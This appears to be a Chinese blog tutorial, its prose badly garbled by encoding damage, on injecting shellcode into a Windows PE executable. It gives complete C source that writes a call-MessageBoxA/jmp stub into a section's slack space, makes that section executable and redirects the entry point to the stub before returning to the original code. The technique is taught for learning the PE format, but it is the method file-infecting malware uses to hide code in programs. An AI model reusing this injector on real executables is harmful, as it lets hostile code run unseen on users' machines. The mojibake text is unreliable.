å†…å­˜ä¸­callæŒ‡ä»¤çš„åœ°å€-5 =771B0D80h-(ImageBase+1A738h)-5 =771B0D80h-(0x400000h+1A738h)-5 =76d96643h è¿™é‡Œipmsgçš„æ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½å€¼ä¸€æ ·ï¼Œæ‰€ä»¥callæŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„RVAå°±æ˜¯FOA é‚£ä¹ˆcallæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€å°±æ˜¯ï¼ˆæ³¨æ„å°ç«¯åºï¼‰ 10xE8, 0x43, 0x66, 0xD9, 0x76,\t//call jmpæŒ‡ä»¤åçš„åç§»è®¡ç®— E9æŒ‡ä»¤åœ°å€ä¸ºï¼š1A73dh æ ¹æ®å…¬å¼ï¼šåç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰jmpæŒ‡ä»¤åœ°å€+5) åç§»å€¼ =OEP-å†…å­˜ä¸­jmpæŒ‡ä»¤çš„åœ°å€ - 5 =(ImageBase+AddressOfEntryPoint) - (ImageBase+jmpæŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„RVAåœ°å€) - 5 =AddressOfEntryPoint - jmpæŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„RVAåœ°å€ - 5 =183D7h - 1a73dh - 5 =FFFFDC95h ï¼ˆè¿™é‡Œipmsgçš„æ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½å€¼ä¸€æ ·ï¼Œæ‰€ä»¥jmpæŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„RVAå°±æ˜¯FOAï¼‰ é‚£ä¹ˆjmpæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€å°±æ˜¯ï¼ˆæ³¨æ„å°ç«¯åºï¼‰ 10xE9, 0x95, 0xDC, 0xFF, 0xFF,\t//jmp ä¿®æ”¹AddressOfEntryPoint æ·»åŠ çš„æŒ‡ä»¤çš„FOAæ˜¯1a730hï¼Œå»å°†AddressOfEntryPointæ”¹ä¸ºè¿™ä¸ªå€¼ æ³¨æ„å°ç«¯åºï¼š 130 a7 01 00 æ‰§è¡Œ æ‰§è¡Œæ•ˆæœï¼šå…ˆå¼¹MessageBoxAï¼Œç„¶åæ‰§è¡Œipmsgç¨‹åºæœ¬èº« å¦‚æœæœ‰é”™è¯¯ç”¨ODæ‰“å¼€æ£€æŸ¥ä¸€ä¸‹ï¼ˆåœ°å€å¾ˆå®¹æ˜“ç®—é”™ï¼Œå¤šæ£€æŸ¥ï¼‰ åœ¨headerså’Œç¬¬ä¸€ä¸ªèŠ‚æ•°æ®ä¹‹é—´åŠ è¿™æ®µshellcodeï¼Œä¼šæŠ¥é”™ï¼› åœ¨èŠ‚ä¸èŠ‚ä¹‹é—´å°±å¯ä»¥ï¼Œä¹Ÿä¸ç”¨æ”¹å±æ€§ä¸ºå¯æ‰§è¡Œ åŸå› ä¸çŸ¥ ç¼–ç¨‹å®ç° æ–¹å¼ä¸€æ–¹å¼äºŒæ–¹å¼ä¸€ç›´æ¥åœ¨FileBufferåŸºç¡€ä¸Šæ·»åŠ shellcodeï¼Œè¿™ä¼šæ¶‰åŠFOAToRVAçš„æ¢ç®— ä¸ºæ–‡ä»¶åˆ›å»ºFileBufferå†…å­˜æ˜ åƒ åœ¨FileBufferä¸Šæ·»åŠ shellcode ä¼šæ¶‰åŠRVAToFOAçš„æ¢ç®— è„‘æµ·ä¸­è¦æœ‰è¯¥PEåŠ è½½åˆ°ImageBaseä¸º0x00400000æ—¶çš„æ ·å­ å­˜ç›˜ åœ¨ImageBufferåŸºç¡€ä¸Šæ·»åŠ shellcodeï¼Œç„¶åå†å‹ç¼©å­˜ç›˜ã€‚å› ä¸ºæ˜¯æ‹‰ä¼¸ç„¶åå†å‹ç¼©ï¼Œå°±ä¸æ¶‰åŠFOAå’ŒRVAçš„æ¢ç®— ä¸ºæ–‡ä»¶åˆ›å»ºFileBufferå†…å­˜æ˜ åƒ å°†FileBufferæ‹‰ä¼¸ä¸ºImageBufferï¼Œåœ¨ImageBufferåŸºç¡€ä¸Šæ·»åŠ shellcode è„‘æµ·ä¸­è¦æœ‰è¯¥PEåŠ è½½åˆ°ImageBase(0x00400000)æ—¶çš„æ ·å­ï¼ˆç®—æŒ‡ä»¤åœ°å€ä¼šæ¶‰åŠåˆ°è¿™ä¸ªçŠ¶æ€ï¼‰ å°†ImageBufferå‹ç¼©ä¸ºNewFileBuffer å­˜ç›˜ èµ·å§‹æŒ‡é’ˆ å¤‡æ³¨ æ–‡ä»¶ FileBuffer pFileBuffer èµ·å§‹åœ°å€ä¸ºpFileBuffer ImageBuffer pImageBuffer èµ·å§‹åœ°å€ä¸ºpImageBuffer è¿è¡Œæ—¶çš„PEæ–‡ä»¶ èµ·å§‹åœ°å€ä¸ºImageBase NewFileBuffer å­˜ç›˜ AddShellcodeå‡½æ•° å‡†å¤‡shellcodeï¼Œcallå’Œjmpåçš„åç§»åœ°å€åé¢ç®—ï¼Œå› ä¸ºå–å†³äºè¿™æ®µshellcodeæ”¾å“ª 12345678910111213141516171819// Shellcode to be added to the PE file.BYTE g_ShellCode[] =&#123;\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0xE8, 0x00, 0x00, 0x00, 0x00,\t0xE9, 0x00, 0x00, 0x00, 0x00\t/* push 0 push 0 push 0 push 0 call 00000000 åç§»åœ°å€å¾…ç®— jmp 00000000 åç§»åœ°å€å¾…ç®—\t*/&#125;; é€‰æ‹©ä¸€ä¸ªèŠ‚æ·»åŠ shellcodeï¼Œåˆ¤æ–­è¯¥èŠ‚æ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ”¾shellcode èŠ‚.SizeOfRawData-èŠ‚.VirtualSizeè¡¨è¿™ä¸ªèŠ‚å‰©ä½™ç©ºé—´ï¼Œå’Œshellcodeé•¿åº¦å¯¹æ¯”ã€‚(SizeOfRawDataæ€»ç©ºé—´ï¼ŒVirtualSizeå®é™…ç”¨åˆ°çš„ç©ºé—´) å¦‚æœå‰©ä½™ç©ºé—´&lt;shellcoeé•¿åº¦ï¼Œè¯´æ˜æ”¾ä¸ä¸‹ 123456//Check if there is enough space in the section to add the shellcodeif ((pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize)&lt; ShellCodeLength)&#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode.&quot;);\treturn FALSE;&#125; è¿™æ®µä»£ç å…¶å®æœ‰é—®é¢˜ç”¨VirtualSize&gt;SizeOfRawDataçš„èŠ‚å»æµ‹è¯•æ—¶ï¼Œå‘ç°è¿˜æ˜¯æ·»åŠ äº†shellcodeè°ƒè¯•å‘ç°ç¼–è¯‘å™¨å°†VirtualSizeå’ŒSizeOfRawDataéƒ½å½“æˆäº†æ— ç¬¦å·æ•°unsigned longï¼ŒDWORDçš„åˆ«åå°±æ˜¯unsigned longã€‚å› ä¸ºä¸¤ä¸ªæ•°éƒ½æ˜¯æ— ç¬¦å·æ•°ï¼Œå¦‚æœç”¨ä»è¾ƒå°çš„VirtualSizeå‡å»è¾ƒå¤§çš„SizeOfRawDataæ—¶ï¼Œç”±äºæ— ç¬¦å·æ•´æ•°ä¸è¡¨ç¤ºè´Ÿæ•°ï¼Œç»“æœä¼šå‘ç”Ÿæ•´æ•°ä¸‹æº¢ï¼Œå¯¼è‡´å¾—åˆ°ä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªè´Ÿæ•°ã€‚å¦‚æœè¦æ­£ç¡®å¤„ç†VirtualSize&gt;SizeOfRawDataçš„æƒ…å†µï¼Œå¯ä»¥åˆ†æ­¥åˆ¤æ–­ï¼šVirtualSizeå’ŒSizeOfRawDataåšå¤§å°æ¯”è¾ƒå¦‚æœVirtualSizeâ‰¥SizeOfRawDataï¼Œæ²¡å‰©ä½™ç©ºé—´ï¼Œè¿”å›é”™è¯¯å¦‚æœVirtualSizeå°SizeOfRawDataï¼Œè®¡ç®—å‰©ä½™ç©ºé—´å‰©ä½™ç©ºé—´å’Œshellcodeé•¿åº¦æ¯”è¾ƒå‰©ä½™ç©ºé—´â‰¥shellcodeé•¿åº¦ï¼Œæ”¾å¾—ä¸‹ï¼Œæ·»åŠ shellcodeå‰©ä½™ç©ºé—´ï¼œshellcodeé•¿åº¦ï¼Œæ”¾ä¸ä¸‹ï¼Œè¿”å›é”™è¯¯ä¿®æ”¹åçš„ä»£ç ï¼š123456789101112if (pTargetSection-&gt;VirtualSize &gt;= pTargetSection-&gt;SizeOfRawData) &#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;);\treturn FALSE;&#125; DWORD availableSpace = pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize;if (availableSpace &lt; ShellCodeLength) &#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;);\treturn FALSE;&#125; å¼€å§‹æ”¾shellcode å‡è®¾shellcodeæ”¾åœ¨ç´§è·ŸèŠ‚.VirtualSizeçš„ä½ç½®ï¼Œé‚£ä¹ˆä½ç½®å°±æ˜¯DWORD(pImageBuffer)+èŠ‚.VirtualAddress+èŠ‚.VirtualSize 12345DWORD shellCodeRVA = pTargetSection-&gt;VirtualAddress + pTargetSection-&gt;Misc.VirtualSize;PBYTE ShellCodeBegin = (PBYTE)((DWORD)pImageBuffer + shellCodeRVA); // Copy the shellcode to the section (èŠ‚.VirtualAddress + èŠ‚.VirtualSize).memcpy(ShellCodeBegin, g_ShellCode, ShellCodeLength); ç®—callåçš„åç§»åœ°å€ï¼Œç„¶åä¿®æ­£pImageBufferä¸­callæŒ‡ä»¤çš„åœ°å€ è¦è·³è½¬çš„åœ°å€ï¼šåŠ¨æ€è·å–è·³è½¬å‡½æ•°MessageBoxAçš„å‡½æ•°åœ°å€ 12HMODULE hModule = LoadLibraryA(&quot;User32.dll&quot;);DWORD FuncAddress = (DWORD)GetProcAddress(hModule, &quot;MessageBoxA&quot;); è®¡ç®—å…¬å¼ï¼šåç§»é‡ = è·³è½¬çš„åœ°å€ - ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ æ³¨æ„ï¼šä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯PEæ–‡ä»¶è¿è¡Œæ—¶çš„åœ°å€ 1234\t//è®¡ç®—callæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€DWORD callRelativeAddr = FuncAddress-(pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0xD); //åç§»é‡=è·³è½¬åœ°å€-callæŒ‡ä»¤ä¸‹ä¸€è¡Œåœ°å€\t//ä¿®æ­£ImageBufferä¸­callåçš„åœ°å€*(PDWORD)(ShellCodeBegin + 0x9) = callRelativeAddr; ç®—jmpåçš„åç§»åœ°å€ï¼Œç„¶åä¿®æ­£pImageBufferä¸­jmpæŒ‡ä»¤çš„åœ°å€ è¦è·³è½¬çš„åœ°å€ä¸ºåŸOEP(ImageBase+AddressOfEntryPoint) 12 //åŸOEPDWORD originalEntryPointRVA = pImageOptionalHeader-&gt;ImageBase + pImageOptionalHeader-&gt;AddressOfEntryPoint; è®¡ç®—å…¬å¼ï¼šåç§»é‡ = è·³è½¬çš„åœ°å€ - ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ æ³¨æ„ï¼šä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯PEæ–‡ä»¶è¿è¡Œæ—¶çš„åœ°å€ 1234 //è®¡ç®—jmpæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€DWORD jmpRelativeAddr = originalEntryPointRVA - (pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0x12); //åç§»é‡=è·³è½¬åœ°å€-jmpæŒ‡ä»¤ä¸‹ä¸€è¡Œåœ°å€ //ä¿®æ­£ImageBufferä¸­jmpåçš„åœ°å€*(PDWORD)(ShellCodeBegin + 0xE) = jmpRelativeAddr; å°†åŸæ¥çš„AddressOfEntryPointä¿®æ”¹ä¸ºshellcodeèµ·å§‹åœ°å€ï¼ˆè¿™æ˜¯ä¸ªRVAå€¼ï¼‰ 12// Update the AddressOfEntryPoint to point to the shellcode.pImageOptionalHeader-&gt;AddressOfEntryPoint = shellCodeRVA; å¢åŠ çš„åŠŸèƒ½ ChooseSectionToAddShellCodeå‡½æ•°ï¼šä¾æ¬¡è¾“å‡ºæ¯ä¸ªèŠ‚çš„Nameå’Œæ˜¯å¦å¯æ‰§è¡Œå±æ€§ï¼Œè®©ç”¨æˆ·è¾“å…¥ï¼Œé€‰æ‹©å“ªä¸ªèŠ‚æ¥æ·»åŠ shellcode 1234567891011121314151617181920212223242526272829303132333435363738//è¾“å‡ºå„ä¸ªèŠ‚è¡¨çš„Nameï¼Œä»¥åŠæ˜¯å¦å¯æ‰§è¡ŒPIMAGE_SECTION_HEADER pTempImageSectionHeader = pSectionHeader; //éå†èŠ‚è¡¨ç”¨çš„for (int i = 0; i &lt; numberOfSections; i++, pTempImageSectionHeader++)&#123;\t//è¾“å‡ºNameï¼Œç¡®ä¿èŠ‚åç§°å ç”¨8ä¸ªå­—ç¬¦å®½åº¦\tchar SectionName[9]; //èŠ‚åç§°æœ€å¤§8ä¸ªå­—ç¬¦ + 1ä¸ªç©ºå­—ç¬¦\tstrncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8);\tSectionName[8] = &#x27;\\0&#x27;; // ç¡®ä¿å­—ç¬¦ä¸²ä»¥ç©ºå­—ç¬¦ç»“å°¾\t// è¾“å‡ºæ˜¯å¦å¯æ‰§è¡Œï¼Œå¹¶ä¸”å¯¹è¾“å‡ºåšå¯¹é½å¤„ç†\tBOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0;\tprintf(&quot; %d: %-10s Executable: %s &quot;, i, SectionName, isExecutable ? &quot;Yes&quot; : &quot;No&quot;);&#125;//è¾“å…¥åŠé”™è¯¯æ£€æŸ¥int chosenSection = -1;BOOL validInput = FALSE;while (!validInput) &#123;\tprintf(&quot;Enter the section number to add the shellcode to (0 to %d): &quot;, numberOfSections - 1);\tif (scanf(&quot;%d&quot;, &amp;chosenSection) == 1) &#123; // ç¡®ä¿è¯»å–åˆ°ä¸€ä¸ªæ•´æ•° if (chosenSection &gt;= 0 &amp;&amp; chosenSection &lt; numberOfSections) &#123; validInput = TRUE; // è¾“å…¥æœ‰æ•ˆ &#125; else &#123; printf(&quot;Invalid section number. Please try again. &quot;); &#125;\t&#125;\telse &#123; // æ¸…é™¤é”™è¯¯çš„è¾“å…¥ while (getchar() != &#x27; &#x27;); printf(&quot;Invalid input. Please enter a number. &quot;);\t&#125;&#125; AddShellcode.cppä¸­ï¼Œè°ƒç”¨ChooseSectionToAddShellCodeå‡½æ•°è®©ç”¨æˆ·é€‰æ‹©å“ªä¸ªèŠ‚å–æ·»åŠ shellcode å¦‚æœé€‰æ‹©çš„èŠ‚çš„Characteristicså­—æ®µæ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå°±å¢åŠ å¯æ‰§è¡Œæƒé™ 123456789// choose section to add the shellcodeint chosenSection = ChooseSectionToAddShellCode(pImageSectionHeader, pImageFileHeader-&gt;NumberOfSections);PIMAGE_SECTION_HEADER pTargetSection = pImageSectionHeader + chosenSection;\t// Check if the chosen section has executable permissionsï¼Œif not ,add itif (!(pTargetSection-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)) &#123;\tprintf(&quot;The chosen section is not executable. Modifying section characteristics to add executable permission. &quot;);\tpTargetSection-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE;&#125; ä»£ç æ¸…å• æ–‡ä»¶å å‡½æ•°åŠŸèƒ½ AddShellcode.hå’ŒAddShellcode.cpp æ·»åŠ shellcode ChooseSectionToAddShellCode.hå’ŒChooseSectionToAddShellCode.cpp ä¾æ¬¡æ‰“å°èŠ‚çš„åºå·ã€åå­—ä»¥åŠæ˜¯å¦å…·å¤‡å¯æ‰§è¡Œå±æ€§è®©ç”¨æˆ·é€‰æ‹©å“ªä¸ªèŠ‚æ¥æ·»åŠ shellcode Global.hå’ŒGlobal.cpp å…¶ä»–å‡½æ•°ï¼šGetFileSizeReadFileToFileBufferFileBufferToImageBufferImageBufferToNewFileBufferMemoryToFile main.cpp ä¸»å‡½æ•° main.cpp AddShellcode.hAddShellcode.cppChooseSectionToAddShellCode.hChooseSectionToAddShellCode.cppGlobal.hGlobal.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;Global.h&quot;#include &quot;AddShellcode.h&quot;#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_added_shellcode.exe&quot;int main()&#123;\t//å°†æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œåˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒFileBuffer\tsize_t length;\tvoid* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length);\tif (NULL == FileBuffer)\t&#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0;\t&#125;\t//FileBuffer-&gt;ImageBufferï¼Œæ‹‰ä¼¸\tDWORD SizeOfImageBuffer;\tvoid* ImageBuffer;\tImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer);\tif (NULL == ImageBuffer)\t&#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0;\t&#125;\t//å¯¹PEæ–‡ä»¶å¢åŠ ShellCode\tBOOL ret = AddShellCodeToPE(ImageBuffer);\tif (!ret)\t&#123; printf(&quot;AddShellCodeToPE failed &quot;); free(FileBuffer); free(ImageBuffer); return 0;\t&#125;\telse\t&#123; printf(&quot;AddShellCodeToPE succeed &quot;);\t&#125;\t//ImageBuffer-&gt;NewFileBufferï¼Œå‹ç¼©\tDWORD SizeOfNewFileBuffer;\tvoid* NewFileBuffer;\tNewFileBuffer = ImageBufferToNewFileBuffer((char*)ImageBuffer, &amp;SizeOfNewFileBuffer);\tif (NULL == NewFileBuffer)\t&#123; printf(&quot;ImageBufferToNewFileBuffer failed &quot;); free(FileBuffer); free(ImageBuffer); return 0;\t&#125;\t//å°†å†…å­˜ä¸­çš„æ•°æ®å†™åˆ°æ–‡ä»¶ä¸­\tif (!MemoryToFile((char*)NewFileBuffer, SizeOfNewFileBuffer, OUTPUT_FILE_PATH))\t&#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0;\t&#125;\telse\t&#123; printf(&quot;MemoryToFile succeed &quot;);\t&#125;\t// ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜\tfree(FileBuffer);\tfree(ImageBuffer);\tfree(NewFileBuffer);\treturn 0;&#125;1234567#pragma once#include &lt;Windows.h&gt;// extern to avoid multiple definitions.extern BYTE g_ShellCode[];BOOL AddShellCodeToPE(void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &quot;ChooseSectionToAddShellCode.h&quot;#include &quot;AddShellcode.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// Shellcode to be added to the PE file.BYTE g_ShellCode[] =&#123;\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0xE8, 0x00, 0x00, 0x00, 0x00,\t0xE9, 0x00, 0x00, 0x00, 0x00\t/* push 0 push 0 push 0 push 0 call 00000000 åç§»åœ°å€å¾…ç®— jmp 00000000 åç§»åœ°å€å¾…ç®—\t*/&#125;;BOOL AddShellCodeToPE(void* pImageBuffer)&#123;\tconst DWORD ShellCodeLength = sizeof(g_ShellCode);\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//1ã€ choose section to add the shellcode\tint chosenSection = ChooseSectionToAddShellCode(pImageSectionHeader, pImageFileHeader-&gt;NumberOfSections);\tPIMAGE_SECTION_HEADER pTargetSection = pImageSectionHeader + chosenSection;\t//2ã€Check if there is enough space in the section to add the shellcode //if ((pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize) &lt; ShellCodeLength) //&#123; //\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode.&quot;); //\treturn FALSE; //&#125;\tif (pTargetSection-&gt;Misc.VirtualSize &gt;= pTargetSection-&gt;SizeOfRawData) &#123; printf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;); return FALSE;\t&#125;\tDWORD availableSpace = pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize;\tif (availableSpace &lt; ShellCodeLength) &#123; printf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;); return FALSE;\t&#125; // Check if the chosen section has executable permissionsï¼Œif not ,add it\tif (!(pTargetSection-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)) &#123; printf(&quot;The chosen section is not executable. Modifying section characteristics to add executable permission. &quot;); pTargetSection-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE;\t&#125; DWORD shellCodeRVA = pTargetSection-&gt;VirtualAddress + pTargetSection-&gt;Misc.VirtualSize;\tPBYTE ShellCodeBegin = (PBYTE)((DWORD)pImageBuffer + shellCodeRVA);\t//3ã€ Copy the shellcode to the section (èŠ‚.VirtualAddress + èŠ‚.VirtualSize).\tmemcpy(ShellCodeBegin, g_ShellCode, ShellCodeLength);\t//4ã€ fix the call and jmp instruction address\t//(1) Calculate and fix the call instruction address. //åŠ¨æ€è·å–æœ¬æœºçš„MessageBoxAå‡½æ•°åœ°å€\tHMODULE hModule = LoadLibraryA(&quot;User32.dll&quot;);\tDWORD FuncAddress = (DWORD)GetProcAddress(hModule, &quot;MessageBoxA&quot;); //è®¡ç®—callæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€\tDWORD callRelativeAddr = FuncAddress-(pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0xD); //åç§»é‡=è·³è½¬åœ°å€-callæŒ‡ä»¤ä¸‹ä¸€è¡Œåœ°å€ //ä¿®æ­£ImageBufferä¸­callåçš„åœ°å€\t*(PDWORD)(ShellCodeBegin + 0x9) = callRelativeAddr;\t//(2) Calculate and fix the jmp instruction address. //åŸOEP\tDWORD originalEntryPointRVA = pImageOptionalHeader-&gt;ImageBase + pImageOptionalHeader-&gt;AddressOfEntryPoint; //è®¡ç®—jmpæŒ‡ä»¤è·Ÿçš„åç§»åœ°å€\tDWORD jmpRelativeAddr = originalEntryPointRVA - (pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0x12); //åç§»é‡=è·³è½¬åœ°å€-jmpæŒ‡ä»¤ä¸‹ä¸€è¡Œåœ°å€ //ä¿®æ­£ImageBufferä¸­jmpåçš„åœ°å€\t*(PDWORD)(ShellCodeBegin + 0xE) = jmpRelativeAddr;\t//5ã€ Update the AddressOfEntryPoint to point to the shellcode.\tpImageOptionalHeader-&gt;AddressOfEntryPoint = shellCodeRVA;\treturn TRUE;&#125;12345678910#pragma once#include &lt;Windows.h&gt;/* å‡½æ•°åŠŸèƒ½ï¼šä¾æ¬¡æ‰“å°èŠ‚çš„åºå·ã€åå­—ä»¥åŠæ˜¯å¦å…·å¤‡å¯æ‰§è¡Œå±æ€§ï¼Œè®©ç”¨æˆ·é€‰æ‹©å“ªä¸ªèŠ‚æ¥æ·»åŠ shellcode inputå‚æ•°ï¼š pSectionHeaderï¼šè¯¥PEæ–‡ä»¶çš„èŠ‚è¡¨æŒ‡é’ˆ numberOfSectionsï¼šPEæ–‡ä»¶çš„èŠ‚æ•°é‡ è¿”å›å€¼ï¼šç”¨æˆ·é€‰æ‹©çš„ç¬¬å‡ ä¸ªèŠ‚*/int ChooseSectionToAddShellCode(const PIMAGE_SECTION_HEADER pSectionHeader, const DWORD numberOfSections);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &quot;ChooseSectionToAddShellCode.h&quot;#pragma warning(disable:4996) //disable warning of unsafe function scanfint ChooseSectionToAddShellCode(const PIMAGE_SECTION_HEADER pSectionHeader, const DWORD numberOfSections)&#123;\t//è¾“å‡ºå„ä¸ªèŠ‚è¡¨çš„Nameï¼Œä»¥åŠæ˜¯å¦å¯æ‰§è¡Œ\tPIMAGE_SECTION_HEADER pTempImageSectionHeader = pSectionHeader; //éå†èŠ‚è¡¨ç”¨çš„\tfor (int i = 0; i &lt; numberOfSections; i++, pTempImageSectionHeader++)\t&#123; //è¾“å‡ºNameï¼Œç¡®ä¿èŠ‚åç§°å ç”¨8ä¸ªå­—ç¬¦å®½åº¦ char SectionName[9]; //èŠ‚åç§°æœ€å¤§8ä¸ªå­—ç¬¦ + 1ä¸ªç©ºå­—ç¬¦ strncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8); SectionName[8] = &#x27;\\0&#x27;; // ç¡®ä¿å­—ç¬¦ä¸²ä»¥ç©ºå­—ç¬¦ç»“å°¾ // è¾“å‡ºæ˜¯å¦å¯æ‰§è¡Œï¼Œå¹¶ä¸”å¯¹è¾“å‡ºåšå¯¹é½å¤„ç† BOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0; printf(&quot; %d: %-10s Executable: %s &quot;, i, SectionName, isExecutable ? &quot;Yes&quot; : &quot;No&quot;); //printf(&quot; %d: &quot;, i); ////è¾“å‡ºName //int j = 0; //const char* pName = (char*)pTempImageSectionHeader-&gt;Name; //while (*pName &amp;&amp; j &lt; 7) //&#123; //\tprintf(&quot;%c&quot;, *pName); //\tpName++; //\tj++; //&#125; //// è¾“å‡ºæ˜¯å¦å¯æ‰§è¡Œ //BOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0; //printf(&quot; Executable: %-8s&quot;, isExecutable ? &quot;Yes&quot; : &quot;No&quot;); //printf(&quot; &quot;);\t&#125;\t//è¾“å…¥åŠé”™è¯¯æ£€æŸ¥\tint chosenSection = -1;\tBOOL validInput = FALSE;\twhile (!validInput) &#123; printf(&quot;Enter the section number to add the shellcode to (0 to %d): &quot;, numberOfSections - 1); if (scanf(&quot;%d&quot;, &amp;chosenSection) == 1) &#123; // ç¡®ä¿è¯»å–åˆ°ä¸€ä¸ªæ•´æ•° if (chosenSection &gt;= 0 &amp;&amp; chosenSection &lt; numberOfSections) &#123; validInput = TRUE; // è¾“å…¥æœ‰æ•ˆ &#125; else &#123; printf(&quot;Invalid section number. Please try again. &quot;); &#125; &#125; else &#123; // æ¸…é™¤é”™è¯¯çš„è¾“å…¥ while (getchar() != &#x27; &#x27;); printf(&quot;Invalid input. Please enter a number. &quot;); &#125;\t&#125;\treturn chosenSection;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#pragma once#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt; //size_t#include &lt;stdio.h&gt;/* å‡½æ•°åŠŸèƒ½ï¼šè·å–æ–‡ä»¶å¤§å° inputå‚æ•°ï¼š pFileï¼šFILE*ç±»å‹ å®ç°åŸç†ï¼šç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æ–‡ä»¶å°¾ï¼Œé€šè¿‡ftellè·å¾—æ–‡ä»¶å¤§å° è¿”å›å€¼ï¼šæ–‡ä»¶å¤§å°*/size_t GetFileSize(FILE* pFile);/* å‡½æ•°åŠŸèƒ½ï¼šå°†ä¸€ä¸ªæ–‡ä»¶è¯»å–åˆ°mallocåˆ†é…çš„å†…å­˜ä¸­ï¼Œè¿”å›åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€ inputå‚æ•°ï¼š filepathï¼šæ–‡ä»¶è·¯å¾„ outputå‚æ•°ï¼š lengthï¼šè¿”å›æ–‡ä»¶é•¿åº¦ è¿”å›å€¼ï¼šè¯¥æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);/* å‡½æ•°åŠŸèƒ½ï¼šå°†FileBufferæ‹‰ä¼¸ä¸ºImageBuffer inputå‚æ•°ï¼š pBufferï¼šæŒ‡å‘FileBufferé¦–åœ°å€çš„æŒ‡é’ˆ outputå‚æ•°ï¼š SizeOfImageBufferï¼šè¿”å›ImageBufferçš„å¤§å°ï¼Œå³SizeOfImageçš„å€¼ è¿”å›å€¼ï¼š æˆåŠŸï¼Œè¿”å›ImageBufferé¦–åœ°å€æŒ‡é’ˆ å¤±è´¥ï¼Œè¿”å›NULL*/void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer);/* 